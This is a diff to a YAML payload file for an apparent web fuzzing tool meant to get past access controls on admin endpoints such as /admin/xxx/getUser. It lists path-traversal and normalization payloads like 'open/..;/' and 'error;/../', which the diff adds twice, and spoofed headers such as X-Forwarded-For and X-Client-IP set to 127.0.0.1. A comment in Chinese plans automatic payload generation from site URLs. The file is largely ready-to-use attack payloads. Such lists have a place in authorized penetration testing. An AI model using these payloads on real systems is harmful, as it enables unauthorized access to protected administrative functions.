@@ -1,3 +1,4 @@
+# 下一步计划，根据网站url路径，自动生成fuzz payload
 prefix: #/{{FUZZ}}admin/xxx/getUser
     - "\\/"
     - "/"
@@ -16,6 +17,8 @@ prefix: #/{{FUZZ}}admin/xxx/getUser
     - "user;/../"
     - "open/..;/"
     - "open;/../"
+    - "error;/../"
+    - "error;/../"
     - "public/..;/"
     - "public;/../"
     - "static/..;/"
@@ -153,13 +156,12 @@ suffix: #取得/admin/xxx/getUser{{FUZZ}}
 
 
 headers:
-    -
-      X-Custom-IP-Authorization: 127.0.0.1
-      X-Forwarded-For: 127.0.0.1
-      X-Client-IP: 127.0.0.1
-      X-Remote-Addr: 127.0.0.1
-      X-Originating-IP: 127.0.0.1
-      Referer: http://127.0.0.1
+    - X-Custom-IP-Authorization: 127.0.0.1
+    - X-Forwarded-For: 127.0.0.1
+    - X-Client-IP: 127.0.0.1
+    - X-Remote-Addr: 127.0.0.1
+    - X-Originating-IP: 127.0.0.1
+    - Referer: http://127.0.0.1
 #    - X-Original-URL: {{Baseurl}}
     - X-Forwarded-For: 127.0.0.1:80
     - X-Forwarded-For: http://127.0.0.1
